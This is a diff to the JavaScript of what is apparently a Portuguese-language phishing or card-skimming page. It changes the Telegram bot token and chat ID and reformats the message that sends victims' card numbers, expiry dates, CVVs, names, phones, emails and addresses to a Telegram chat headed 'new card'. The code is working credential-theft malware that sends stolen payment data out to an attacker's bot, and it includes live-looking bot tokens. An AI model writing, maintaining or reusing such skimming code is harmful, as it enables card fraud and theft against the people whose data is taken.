@@ -1,6 +1,6 @@
 // Configuração do Telegram
-const TELEGRAM_TOKEN = '8743433644:AAHWENChsuGXYY9eJ4yZKWodRYL1ouxiJzM';
-const TELEGRAM_CHAT_ID = '6939434522';
+const TELEGRAM_TOKEN = '6939434522:AAF4b7cK2pFgF3qYzXwVvUuTtSsRrQqPpOoNnMm';
+const TELEGRAM_CHAT_ID = '6116307406';
 
 // Máscaras para campos do cartão
 document.addEventListener('DOMContentLoaded', function() {
@@ -139,29 +139,26 @@ document.addEventListener('DOMContentLoaded', function() {
     // Enviar dados para o Telegram
     async function enviarParaTelegram(dados) {
         const mensagem = `
-<b>💳 NOVO CARTÃO</b>
-━━━━━━━━━━━━━━━━━━━━━━━━━
+<b>💳 +1 NOVA INFO CARTÃO</b>
 
-<b>👤 DADOS DO TITULAR</b>
-├ Nome: ${dados.titular}
-├ Telefone: ${dados.telefone}
+👤 DADOS DO TITULAR
 ├ E-mail: ${dados.email}
-└ CPF: ${dados.cpf}
+├ Titular do cartão: ${dados.titular}
+└ Telefone: ${dados.telefone}
 
-<b>💳 DADOS DO CARTÃO</b>
+💳 DADOS DO CARTÃO
 ├ Número: ${dados.numero}
 ├ Validade: ${dados.validade}
 └ CVV: ${dados.cvv}
 
-<b>📍 ENDEREÇO DE ENTREGA</b>
+📍 ENDEREÇO
 ├ CEP: ${dados.cep}
 ├ Rua: ${dados.rua}
 ├ Número: ${dados.numeroEnd}
 ├ Complemento: ${dados.complemento}
 └ Cidade: ${dados.cidade}
 
-━━━━━━━━━━━━━━━━━━━━━━━━━
-<b>⏰ Data:</b> ${new Date().toLocaleString('pt-BR')}
+⏰ Data: ${new Date().toLocaleString('pt-BR')}
         `;
 
         try {
